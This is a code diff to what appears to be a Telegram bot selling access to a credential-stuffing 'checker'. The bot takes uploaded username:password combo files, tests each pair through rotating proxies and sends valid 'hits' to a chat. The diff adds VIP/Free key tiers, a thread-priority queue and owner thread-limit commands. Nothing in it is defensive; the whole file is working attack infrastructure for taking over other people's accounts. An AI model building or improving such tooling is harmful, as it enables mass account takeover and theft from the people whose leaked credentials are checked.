@@ -92,12 +92,14 @@ _deletekey_selection: dict = {}  # chat_id -> set of key strings
 
 # Hard cap on total checker threads across ALL users at once
 MAX_GLOBAL_THREADS   = 50     # Railway can handle 50 with lean sessions (~10MB each)
-# Threads per individual user (limits one user hogging everything)
-MAX_THREADS_PER_USER = 10     # 10 threads per user — fast checking
+# Threads per individual Free user (limits one user hogging everything)
+FREE_THREADS_PER_USER = 2     # Free key users: 2 threads — queued, waits for slot
 # Max users running the checker simultaneously
 MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
-# VIP users get higher thread count for faster checking
-VIP_THREADS_PER_USER = 10     # VIP users: 10 threads
+# VIP users get higher thread count for faster checking — NO QUEUE
+VIP_THREADS_PER_USER = 10     # VIP users: 10 threads — instant, no queuing
+# Legacy alias — kept for backward compat in some messages
+MAX_THREADS_PER_USER = FREE_THREADS_PER_USER
 
 # Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
 _global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)
@@ -3334,6 +3336,7 @@ def _save_profile(chat_id, d: dict):
             "key":          d.get("key"),
             "key_expires":  d.get("key_expires", 0),
             "combo_limit":  d.get("combo_limit", COMBO_LINE_LIMIT),
+            "key_tier":     d.get("key_tier", "free"),
         }
         if d.get("username"):
             _saved_users[d["username"].lstrip("@").lower()] = _saved_users[key]
@@ -3361,6 +3364,7 @@ def _handle_start(token: str, chat_id, from_user: dict):
         d["key"]          = saved.get("key")
         d["key_expires"]  = saved.get("key_expires", 0)
         d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
+        d["key_tier"]     = saved.get("key_tier", "free")
 
         lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
         cf_map     = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
@@ -3666,8 +3670,8 @@ def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
         f"🔍 <b>Hits:</b> <code>{cf_map[d['clean_filter']]}</code>\n"
         f"📩 <b>Sending hits to:</b> <code>{hits_id}</code>\n"
         f"📦 <b>Limit:</b> <code>{limit_display}</code>\n"
-        f"🧵 <b>Threads:</b> <code>{VIP_THREADS_PER_USER if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else MAX_THREADS_PER_USER}</code>"
-        f"{'  ⭐ VIP' if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else ''}\n\n"
+        f"🧵 <b>Threads:</b> <code>{VIP_THREADS_PER_USER if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else FREE_THREADS_PER_USER}</code>"
+        f"{'  ⭐ VIP (no queue)' if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else '  🆓 Free (queued)'}\n\n"
         f"<i>Hits will appear as they come in... Send /stop to cancel.</i>"
     )
 
@@ -3964,6 +3968,187 @@ def _apply_bot_log_filter():
 _apply_bot_log_filter()
 
 
+# ──────────────────────────────────────────────────────────────
+#  VIP/FREE PRIORITY QUEUE SYSTEM
+#  ── VIP keys: NO queue — instant processing, dedicated threads
+#  ── Free keys: HAVE queue — wait in line for limited slots
+#  ── Semaphore-first design prevents race conditions
+# ──────────────────────────────────────────────────────────────
+
+from queue import Queue as _ThreadQueue
+
+class VipFreeQueue:
+    """
+    Priority queue for VIP/Free account processing.
+    
+    - VIP accounts: NO queue — workers acquire semaphore (always available),
+      then grab account. Since # VIP workers = vip_threads, semaphore never
+      blocks → instant processing.
+    - Free accounts: HAVE queue — workers acquire semaphore FIRST (blocks if
+      all free_threads slots taken = QUEUE), then grab account. This IS the
+      queue mechanism.
+    
+    CRITICAL: Semaphore is acquired BEFORE pulling from queue.
+    This prevents the race condition where a worker pulls an account but
+    then blocks on the semaphore, making that account invisible.
+    """
+
+    def __init__(self, vip_threads: int, free_threads: int):
+        self.vip_queue = _ThreadQueue()
+        self.free_queue = _ThreadQueue()
+        self._lock = threading.Lock()
+        self._vip_added = 0
+        self._free_added = 0
+        self._vip_done = 0
+        self._free_done = 0
+        self._total = 0
+        self._done = 0
+        self._stop_event = threading.Event()
+        self.vip_threads = vip_threads
+        self.free_threads = free_threads
+
+        # VIP semaphore: matches # of VIP workers → never blocks (no queue)
+        # Free semaphore: limits concurrent Free workers → THIS IS THE QUEUE
+        self._vip_sem = threading.Semaphore(vip_threads)
+        self._free_sem = threading.Semaphore(free_threads)
+
+        # Track accounts "in flight" (pulled from queue but not yet done)
+        self._vip_in_flight = 0
+        self._free_in_flight = 0
+
+    def add_vip(self, account: dict):
+        """Add VIP account — NO queue, goes straight to processing."""
+        with self._lock:
+            self._vip_added += 1
+            self._total += 1
+        self.vip_queue.put(account)
+
+    def add_free(self, account: dict):
+        """Add Free account — goes into the queue, waits for available slot."""
+        with self._lock:
+            self._free_added += 1
+            self._total += 1
+        self.free_queue.put(account)
+
+    def acquire_vip_slot(self, timeout: float = None) -> bool:
+        """Acquire a VIP processing slot. Returns True if acquired."""
+        return self._vip_sem.acquire(timeout=timeout)
+
+    def release_vip_slot(self):
+        """Release a VIP processing slot."""
+        self._vip_sem.release()
+
+    def acquire_free_slot(self, timeout: float = None) -> bool:
+        """Acquire a Free processing slot. BLOCKS if all free slots taken = QUEUE."""
+        return self._free_sem.acquire(timeout=timeout)
+
+    def release_free_slot(self):
+        """Release a Free processing slot."""
+        self._free_sem.release()
+
+    def get_vip(self):
+        """Get next VIP account (non-blocking). Returns None if empty."""
+        try:
+            account = self.vip_queue.get_nowait()
+            with self._lock:
+                self._vip_in_flight += 1
+            return account
+        except Exception:
+            return None
+
+    def get_free(self):
+        """Get next Free account (non-blocking). Returns None if empty."""
+        try:
+            account = self.free_queue.get_nowait()
+            with self._lock:
+                self._free_in_flight += 1
+            return account
+        except Exception:
+            return None
+
+    def mark_vip_done(self):
+        with self._lock:
+            self._vip_done += 1
+            self._done += 1
+            self._vip_in_flight = max(0, self._vip_in_flight - 1)
+
+    def mark_free_done(self):
+        with self._lock:
+            self._free_done += 1
+            self._done += 1
+            self._free_in_flight = max(0, self._free_in_flight - 1)
+
+    @property
+    def vip_pending(self):
+        return self.vip_queue.qsize()
+
+    @property
+    def free_pending(self):
+        return self.free_queue.qsize()
+
+    @property
+    def vip_remaining(self):
+        """Accounts still in queue + in flight."""
+        with self._lock:
+            return self.vip_queue.qsize() + self._vip_in_flight
+
+    @property
+    def free_remaining(self):
+        """Accounts still in queue + in flight."""
+        with self._lock:
+            return self.free_queue.qsize() + self._free_in_flight
+
+    @property
+    def progress(self):
+        with self._lock:
+            if self._total == 0:
+                return 0
+            return (self._done / self._total) * 100
+
+    def all_done(self):
+        """True when every added account has been fully processed."""
+        with self._lock:
+            return self._done >= self._total and self._total > 0
+
+    def stop(self):
+        self._stop_event.set()
+
+    def should_stop(self):
+        return self._stop_event.is_set()
+
+
+def _get_user_tier(chat_id) -> str:
+    """
+    Get the key tier for a user: 'vip' or 'free'.
+    Returns 'vip' if user has a valid vip-tier key, 'free' otherwise.
+    Also caches tier in user data so we don't have to look up the key every time.
+    """
+    d = _udata(chat_id)
+    # Check cached tier first
+    cached_tier = d.get("key_tier")
+    key = d.get("key")
+    key_expires = d.get("key_expires", 0)
+    
+    # If key is valid, look up its tier from the keys store
+    if key and time.time() < key_expires:
+        keys = _load_keys()
+        entry = keys.get(key)
+        if entry:
+            tier = entry.get("tier", "free")
+            # Cache it
+            d["key_tier"] = tier
+            return tier
+        # Key not in store — check saved profile
+        saved = _get_saved_profile(str(chat_id))
+        if saved and saved.get("key_tier"):
+            tier = saved["key_tier"]
+            d["key_tier"] = tier
+            return tier
+    
+    # No valid key — return 'free' (unregistered users are free tier)
+    return cached_tier or "free"
+
+
 def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, label: str = "user", stop_event=None) -> tuple:
     """Returns (stats_dict, result_folder_path)"""
     if not os.path.exists(filepath):
@@ -3991,11 +4176,27 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
         return {}, result_folder
 
     total            = len(accounts)
-    # ── Pick thread count: VIP/owner get VIP threads, others get normal ──
-    is_vip = _is_vip_user(chat_id) if chat_id else False
+    # ── Determine user tier: VIP = no queue, Free = queued ──
     is_owner = (chat_id == OWNER_ID or chat_id in COOWNER_IDS) if chat_id else False
-    MAX_THREADS = VIP_THREADS_PER_USER if (is_vip or is_owner) else MAX_THREADS_PER_USER
-    logger.info(f"[CHECKER] {label} → {MAX_THREADS} threads ({'VIP' if is_vip else 'owner' if is_owner else 'normal'})")
+    is_vip = _is_vip_user(chat_id) if chat_id else False
+    user_tier = _get_user_tier(chat_id) if chat_id else "free"
+    # Owner always counts as VIP tier
+    if is_owner:
+        user_tier = "vip"
+        is_vip = True
+
+    # ── Pick thread count based on tier ──
+    # VIP: VIP_THREADS_PER_USER threads, NO QUEUE — instant processing
+    # Free: FREE_THREADS_PER_USER threads, HAS QUEUE — waits for slot
+    if user_tier == "vip" or is_vip or is_owner:
+        vip_threads = VIP_THREADS_PER_USER
+        free_threads = 0
+    else:
+        vip_threads = 0
+        free_threads = FREE_THREADS_PER_USER
+
+    tier_label = "⭐ VIP (no queue)" if (user_tier == "vip" or is_vip or is_owner) else "🆓 Free (queued)"
+    logger.info(f"[CHECKER] {label} → VIP:{vip_threads} Free:{free_threads} threads ({tier_label})")
     cookie_manager   = CookieManager()
     live_stats       = LiveStats()
     live_stats.start_tracking(total)
@@ -4067,49 +4268,190 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
             thread_local.session.proxies.update(geo_rotator.get_proxies())
         return thread_local.session, thread_local.dm
 
-    def process_one(idx_line):
-        i, line = idx_line
+    # ── Helper: process a single account line ──
+    def _do_account(line, account_idx):
+        """Process one account. Returns True if processed, False if skipped."""
         if ":" not in line:
-            return
-        # Check both user stop and global shutdown
+            return False
         if stop_event and stop_event.is_set():
-            return
+            return False
         if shutdown_event.is_set():
-            return
-        # ── Acquire global slot — blocks if VPS is at capacity ──
-        _global_thread_sem.acquire()
-        try:
-            if stop_event and stop_event.is_set(): return
-            if shutdown_event.is_set(): return
-            user, pwd = line.split(":", 1)
-            sess, dm  = get_session()
-            processaccount(sess, user.strip(), pwd.strip(),
-                           cookie_manager, dm, live_stats,
-                           result_folder, telegram_config=telegram_config)
-        except Exception as e:
-            logger.debug(f"[CHECKER] Error on account #{i}: {str(e)[:80]}")
-        finally:
-            _global_thread_sem.release()
-            with _bars_lock:
-                if bar_key in _active_bars:
-                    done_count[0] += 1
-                    elapsed = max(time.time() - start_t, 0.001)
-                    speed   = int(done_count[0] / elapsed)
-                    _active_bars[bar_key]["done"]  = done_count[0]
-                    _active_bars[bar_key]["speed"] = speed
-            # Persist progress every 50 accounts for crash recovery
-            if chat_id and done_count[0] % 50 == 0:
-                _update_session_progress(chat_id, done_count[0])
+            return False
+        user, pwd = line.split(":", 1)
+        sess, dm  = get_session()
+        processaccount(sess, user.strip(), pwd.strip(),
+                       cookie_manager, dm, live_stats,
+                       result_folder, telegram_config=telegram_config)
+        return True
 
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-        for fut in as_completed(
-            {ex.submit(process_one, item): item
-             for item in enumerate(accounts, 1)}
-        ):
+    def _update_progress():
+        """Update progress bar and persist progress."""
+        with _bars_lock:
+            if bar_key in _active_bars:
+                done_count[0] += 1
+                elapsed = max(time.time() - start_t, 0.001)
+                speed   = int(done_count[0] / elapsed)
+                _active_bars[bar_key]["done"]  = done_count[0]
+                _active_bars[bar_key]["speed"] = speed
+        # Persist progress every 50 accounts for crash recovery
+        if chat_id and done_count[0] % 50 == 0:
+            _update_session_progress(chat_id, done_count[0])
+
+    # ════════════════════════════════════════════════════════════════
+    #  VIP/FREE QUEUE WORKER SYSTEM
+    #
+    #  VIP users: NO QUEUE — workers acquire semaphore (always available),
+    #    then grab account → instant processing.
+    #  Free users: HAVE QUEUE — workers acquire semaphore FIRST (blocks if
+    #    all free_threads slots taken), then grab account → queued.
+    #
+    #  Semaphore-first design prevents race conditions where a worker
+    #  pulls an account but blocks on semaphore, making account invisible.
+    # ════════════════════════════════════════════════════════════════
+
+    # Create priority queue with the user's thread allocation
+    pq = VipFreeQueue(vip_threads or 1, free_threads or 1)
+
+    # Add all accounts to the appropriate queue based on user tier
+    # ALL accounts from this user go to the SAME queue (VIP or Free)
+    # because the tier is per-USER, not per-account
+    for idx, line in enumerate(accounts, 1):
+        account = {"username": line.split(":")[0].strip() if ":" in line else "",
+                   "password": line.split(":", 1)[1].strip() if ":" in line else "",
+                   "line": line, "idx": idx}
+        if user_tier == "vip" or is_vip or is_owner:
+            pq.add_vip(account)
+        else:
+            pq.add_free(account)
+
+    # ── VIP Worker: Acquires slot FIRST (instant), then processes account ──
+    # KEY: VIP semaphore is acquired BEFORE pulling from queue.
+    # Since # of VIP workers = vip_threads, the semaphore always has slots
+    # available → NO QUEUE for VIP accounts.
+    def vip_worker():
+        while not pq.should_stop():
+            # Step 1: Acquire VIP slot (instant — dedicated VIP pool)
+            if not pq.acquire_vip_slot(timeout=0.5):
+                # Timeout — check if there's still work
+                if pq.vip_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                continue
+
+            # Step 2: Get next VIP account
+            account = pq.get_vip()
+            if account is None:
+                # No account in queue — release slot and wait
+                pq.release_vip_slot()
+                if pq.vip_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                time.sleep(0.05)
+                continue
+
+            # Step 3: Acquire global VPS slot, then process
+            _global_thread_sem.acquire()
             try:
-                fut.result()
-            except Exception:
-                pass
+                if stop_event and stop_event.is_set():
+                    return
+                if shutdown_event.is_set():
+                    return
+                _do_account(account['line'], account['idx'])
+            except Exception as e:
+                logger.debug(f"[VIP-WORKER] Error: {e}")
+            finally:
+                _global_thread_sem.release()
+                pq.release_vip_slot()
+                pq.mark_vip_done()
+                _update_progress()
+
+    # ── Free Worker: Acquires slot FIRST (BLOCKS if full = QUEUE), then processes ──
+    # KEY: Free semaphore is acquired BEFORE pulling from queue.
+    # If all free_threads slots are taken, the worker WAITS here — this IS the queue.
+    # Once a slot opens up, the worker grabs the next account and processes it.
+    def free_worker():
+        while not pq.should_stop():
+            # Step 1: Acquire Free slot — THIS IS THE QUEUE
+            # If all free_threads slots are busy, worker blocks here until one opens
+            if not pq.acquire_free_slot(timeout=0.5):
+                # Timeout — check if there's still work
+                if pq.free_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                continue
+
+            # Step 2: Get next Free account (now that we have a slot)
+            account = pq.get_free()
+            if account is None:
+                # No account in queue — release slot and wait
+                pq.release_free_slot()
+                if pq.free_remaining == 0:
+                    break
+                if stop_event and stop_event.is_set():
+                    break
+                if shutdown_event.is_set():
+                    break
+                time.sleep(0.05)
+                continue
+
+            # Step 3: Acquire global VPS slot, then process
+            _global_thread_sem.acquire()
+            try:
+                if stop_event and stop_event.is_set():
+                    return
+                if shutdown_event.is_set():
+                    return
+                _do_account(account['line'], account['idx'])
+            except Exception as e:
+                logger.debug(f"[FREE-WORKER] Error: {e}")
+            finally:
+                _global_thread_sem.release()
+                pq.release_free_slot()
+                pq.mark_free_done()
+                _update_progress()
+
+    # ── Start workers ──
+    workers = []
+
+    if vip_threads > 0:
+        # VIP workers — always running, drain VIP queue instantly (NO QUEUE)
+        for i in range(vip_threads):
+            t = threading.Thread(target=vip_worker, name=f"VIP-{i+1}", daemon=True)
+            t.start()
+            workers.append(t)
+
+    if free_threads > 0:
+        # Free workers — limited, processes Free queue (HAS QUEUE)
+        for i in range(free_threads):
+            t = threading.Thread(target=free_worker, name=f"FREE-{i+1}", daemon=True)
+            t.start()
+            workers.append(t)
+
+    # ── Wait for all accounts to be fully processed ──
+    while not pq.all_done():
+        if stop_event and stop_event.is_set():
+            pq.stop()
+            break
+        if shutdown_event.is_set():
+            pq.stop()
+            break
+        time.sleep(1)
+
+    # Signal stop to all workers
+    pq.stop()
+
+    # Wait for workers to finish
+    for t in workers:
+        t.join(timeout=3)
 
     # ── Stop the progress updater ──────────────────────────────
     _progress_stop.set()
@@ -5004,11 +5346,12 @@ def _handle_server_status(token: str, chat_id, from_user: dict):
 def _handle_set_threads(token: str, chat_id, from_user: dict, args: str):
     """
     /setthreads              — show current settings
-    /setthreads <N>          — set normal threads per user
+    /setthreads <N>          — set Free threads per user
+    /setthreads free <N>     — set Free threads per user
     /setthreads vip <N>      — set VIP threads per user
     /setthreads global <N>   — set global thread cap
     """
-    global MAX_THREADS_PER_USER, VIP_THREADS_PER_USER, MAX_GLOBAL_THREADS, _global_thread_sem
+    global FREE_THREADS_PER_USER, MAX_THREADS_PER_USER, VIP_THREADS_PER_USER, MAX_GLOBAL_THREADS, _global_thread_sem
 
     if not _is_owner(from_user):
         _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
@@ -5021,35 +5364,48 @@ def _handle_set_threads(token: str, chat_id, from_user: dict, args: str):
         _tg_send(token, chat_id,
             f"🧵 <b>Thread Settings</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"  👤 Normal: <b>{MAX_THREADS_PER_USER}</b> threads/user\n"
-            f"  ⭐ VIP: <b>{VIP_THREADS_PER_USER}</b> threads/user\n"
+            f"  🆓 Free: <b>{FREE_THREADS_PER_USER}</b> threads/user (queued)\n"
+            f"  ⭐ VIP: <b>{VIP_THREADS_PER_USER}</b> threads/user (no queue)\n"
             f"  🌐 Global cap: <b>{MAX_GLOBAL_THREADS}</b> threads\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"<b>Usage:</b>\n"
-            f"  <code>/setthreads 10</code> — set normal to 10\n"
-            f"  <code>/setthreads vip 8</code> — set VIP to 8\n"
+            f"  <code>/setthreads 5</code> — set Free to 5\n"
+            f"  <code>/setthreads free 5</code> — set Free to 5\n"
+            f"  <code>/setthreads vip 10</code> — set VIP to 10\n"
             f"  <code>/setthreads global 40</code> — set global cap to 40")
         return
 
     # Parse: /setthreads <N> or /setthreads <type> <N>
     try:
         if len(parts) == 1:
-            # /setthreads <N> — set normal threads
+            # /setthreads <N> — set Free threads
             new_val = int(parts[0])
             if new_val < 1 or new_val > 50:
                 _tg_send(token, chat_id, "❌ Thread count must be between <code>1</code> and <code>50</code>.")
                 return
-            old_val = MAX_THREADS_PER_USER
-            MAX_THREADS_PER_USER = new_val
+            old_val = FREE_THREADS_PER_USER
+            FREE_THREADS_PER_USER = new_val
+            MAX_THREADS_PER_USER = new_val  # keep alias in sync
             _tg_send(token, chat_id,
-                f"✅ <b>Normal threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
+                f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
                 f"<i>Takes effect for new checkers. Running checkers keep their current threads.</i>")
 
         elif len(parts) == 2:
             target = parts[0]
             new_val = int(parts[1])
 
-            if target == "vip":
+            if target == "free":
+                if new_val < 1 or new_val > 50:
+                    _tg_send(token, chat_id, "❌ Free thread count must be between <code>1</code> and <code>50</code>.")
+                    return
+                old_val = FREE_THREADS_PER_USER
+                FREE_THREADS_PER_USER = new_val
+                MAX_THREADS_PER_USER = new_val  # keep alias in sync
+                _tg_send(token, chat_id,
+                    f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
+                    f"<i>Takes effect for new checkers.</i>")
+
+            elif target == "vip":
                 if new_val < 1 or new_val > 50:
                     _tg_send(token, chat_id, "❌ VIP thread count must be between <code>1</code> and <code>50</code>.")
                     return
@@ -5073,11 +5429,11 @@ def _handle_set_threads(token: str, chat_id, from_user: dict, args: str):
             else:
                 _tg_send(token, chat_id,
                     f"❌ Unknown target: <code>{target}</code>\n"
-                    f"Use: <code>/setthreads [vip|global] &lt;number&gt;</code>")
+                    f"Use: <code>/setthreads [free|vip|global] &lt;number&gt;</code>")
         else:
             _tg_send(token, chat_id,
                 f"❌ Too many arguments.\n"
-                f"Use: <code>/setthreads &lt;number&gt;</code> or <code>/setthreads vip &lt;number&gt;</code>")
+                f"Use: <code>/setthreads &lt;number&gt;</code> or <code>/setthreads [free|vip|global] &lt;number&gt;</code>")
 
     except ValueError:
         _tg_send(token, chat_id, "❌ Invalid number. Use: <code>/setthreads 10</code>")
@@ -5476,13 +5832,14 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
         d["key"]         = key
         d["key_expires"] = entry["expires"]
         d["combo_limit"] = entry.get("combo_limit", 500)
+        d["key_tier"]    = entry.get("tier", "free")
         _save_profile(chat_id, d)
         remaining  = int(entry["expires"] - now)
         hrs  = remaining // 3600
         mins = (remaining % 3600) // 60
         slots_max = "∞" if max_users == 0 else str(max_users)
         _tg_send(token, chat_id,
-            f"✅ <b>Access Restored!</b> ⭐ VIP\n\n"
+            f"✅ <b>Access Restored!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
             f"🔑 <b>Key:</b> <code>{key}</code>\n"
             f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
             f"👥 <b>Slots:</b> {len(used_by)}/{slots_max}\n"
@@ -5509,6 +5866,7 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
     d["key"]         = key
     d["key_expires"] = entry["expires"]
     d["combo_limit"] = entry.get("combo_limit", 500)
+    d["key_tier"]    = entry.get("tier", "free")
     _save_profile(chat_id, d)
 
     remaining  = int(entry["expires"] - now)
@@ -5519,7 +5877,7 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
 
     # ── Success message ────────────────────────────────────────
     _tg_send(token, chat_id,
-        f"✅ <b>Key Redeemed Successfully!</b> ⭐ VIP\n\n"
+        f"✅ <b>Key Redeemed Successfully!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔑 <b>Key:</b> <code>{key}</code>\n"
         f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
@@ -5554,6 +5912,7 @@ def _check_access(token: str, chat_id, from_user: dict) -> bool:
             d["key"]         = saved["key"]
             d["key_expires"] = saved["key_expires"]
             d["combo_limit"] = saved.get("combo_limit", 500)
+            d["key_tier"]    = saved.get("key_tier", "free")
             return True
 
     _tg_send(token, chat_id,
@@ -7220,6 +7579,7 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
             d["key"]          = saved.get("key")
             d["key_expires"]  = saved.get("key_expires", 0)
             d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
+            d["key_tier"]     = saved.get("key_tier", "free")
             _bot_state[chat_id] = "AWAIT_FILE"
         else:
             _bot_state[chat_id] = "AWAIT_LEVEL"
